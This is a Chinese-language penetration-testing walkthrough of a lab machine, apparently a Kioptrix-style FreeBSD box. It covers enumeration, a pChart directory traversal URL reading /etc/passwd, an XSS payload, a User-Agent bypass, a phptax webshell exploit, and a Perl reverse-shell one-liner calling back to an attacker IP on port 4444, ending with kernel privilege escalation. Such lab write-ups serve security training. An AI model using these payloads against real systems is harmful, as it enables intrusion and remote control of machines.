## 扫描
```
sudo nmap -Pn -sC -sV -O 192.168.80.128

```


## web枚举

* 查看80页面源码发现了个目录

	![[Pasted image 20240124150547.png]]

* 打开后用searchsploit搜索关键字pChart发现了目录穿越和XSS漏洞
	![[Pasted image 20240124150806.png]]

```

目录穿越
http://192.168.80.128/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd

XSS
"http://192.168.80.128/pChart2.1.3/examples/sandbox/script/session.php?<script>alert('XSS')</script>

```

>对暴露出的两个路径进行扫描

```
# sudo dirsearch -u "http://192.168.80.128/pChart2.1.3/"
	[15:00:13] 301 -  248B  - /pChart2.1.3/cache  
	[15:00:13] 200 -  250B  - /pChart2.1.3/cache/
	[15:00:14] 200 -   24KB - /pChart2.1.3/change.log
	[15:00:15] 301 -  248B  - /pChart2.1.3/class  
	[15:00:42] 301 -  247B  - /pChart2.1.3/data 
	[15:00:42] 200 -  324B  - /pChart2.1.3/data/
	[15:00:55] 301 -  251B  - /pChart2.1.3/examples  
	[15:00:55] 200 -   85KB - /pChart2.1.3/examples/
	[15:01:12] 301 -  248B  - /pChart2.1.3/fonts  
	[15:02:39] 200 -   12KB - /pChart2.1.3/readme.txt


# sudo dirsearch -u "http://192.168.80.128/pChart2.1.3/examples"
	[15:02:01] 301 -  260B  - /pChart2.1.3/examples/pictures 
	[15:02:15] 301 -  261B  - /pChart2.1.3/examples/resources 
	[15:02:15] 200 -    1KB - /pChart2.1.3/examples/resources/
```

> 查看readme.txt后发现了网站更详细的目录

``` 
 ┬
 │
 ├─ /cache			This folder is used by the pCache module.
 │
 ├─ /class			This folder contains the library core classes.
 │   │
 │   ├─ pBarcode39.class	Class to draw Code 39 barcodes.
 │   ├─ pBarcode128.class	Class to draw Code 128 barcodes.
 │   ├─ pBubble.class		Class to draw bubble charts.
 │   ├─ pCache.class		Class enable chart caching functionalities.
 │   ├─ pData.class		Class to manipulate chart data.
 │   ├─ pDraw.class		Extended drawing functions.
 │   ├─ pIndicator.class	Class to draw indicators.
 │   ├─ pImage.class		Core drawing functions.
 │   ├─ pPie.class		Class to draw pie charts.
 │   ├─ pSplit.class		Class to draw split path charts.
 │   ├─ pSpring.class		Class to draw spring charts.
 │   ├─ pScatter.class		Class to draw scatter charts.
 │   ├─ pStock.class		Class to draw stock charts.
 │   └─ pSurface.class		Class to draw surface charts.
 │
 ├─ /data			This folder contains extended data.
 │   │
 │   ├─ 39.db			Code 39 barcodes static database.
 │   └─ 128.db			Code 128 barcodes static database.
 │
 ├─ /examples			This folder contains some PHP examples.
 │   │
 │   ├─ delayedLoader		Delayed loader script example.
 │   ├─ imageMap		Image map script example.
 │   └─ sandbox			Powerful dev. tool to design your charts.
 │
 ├─ /fonts			This folder contains a bunch of TTF fonts.
 │
 ├─ /palettes			Sample palettes files.
 │
 ├─ change.log			History of all the changes since the 2.0
 ├─ GPLv3.txt			GPLv3 official text.
 └─ readme.txt			This file.

```

```shell
对两个文件解密：
39.db

--> for i in $(cat 39new.db);do echo "obase=16;ibase=2;$i" | bc ;sleep 0.3;done

result : Ҳ٦ӳҲԴڬֶԴյڭֶյʚ͖˛ʚ

128B.db

--> for i in $(cat 128Bnew.db);do echo "obase=16;ibase=2;$i" | bc ;sleep 0.3;done

result : lffIHDLLFddbYML\NNgedngvtrrvssmlcQEDXFFhbb[XF]\GwhbnnnutqvvqwdxSPKHBBYXMLCCae{aGSKI^OOzyymo{WQE^^zz]^uzhii

没得到任何结果
```


`$FreeBSD: release/9.0.0/etc/master.passwd 218047 2011-01-28 22:29:38Z pjd $`
>网上找到FreeBSD的apache路径，从apache配置文件找到了8080端口登录需要修改UA头
>在burp中的tools->proxy->match and replace rules 中修改ua头为mozilla/4.0



然后再次访问8080就可以显示页面，使用searchsploit phptax 发现了漏洞利用方式
![[Pasted image 20240127161844.png]]

向这个路径写入一句话
![[Pasted image 20240127162032.png]]

扫描站点

```SHELL
sudo gobuster dir -u "http://192.168.80.128:8080/phptax/" -x php,txt,xml,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)' -b 403,404
或
sudo dirsearch -u "http://192.168.80.128:8080/phptax/" --user-agent='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)'


/index.php            (Status: 200) [Size: 11974]
/files                (Status: 301) [Size: 248] [--> http://192.168.80.128:8080/phptax/files/]
/data                 (Status: 301) [Size: 247] [--> http://192.168.80.128:8080/phptax/data/]
/pictures             (Status: 301) [Size: 251] [--> http://192.168.80.128:8080/phptax/pictures/]
/maps                 (Status: 301) [Size: 247] [--> http://192.168.80.128:8080/phptax/maps/]
/readme               (Status: 301) [Size: 249] [--> http://192.168.80.128:8080/phptax/readme/]

```

去到站点发现了上传的一句话

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.26.32.20:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

将反弹shell进行url编码，然后kali监听，得到shell
```

![[Pasted image 20240127165652.png]]
使用内核提权

使用 nc 将文件传输到靶机，直接gcc后，运行可执行文件后提权成功
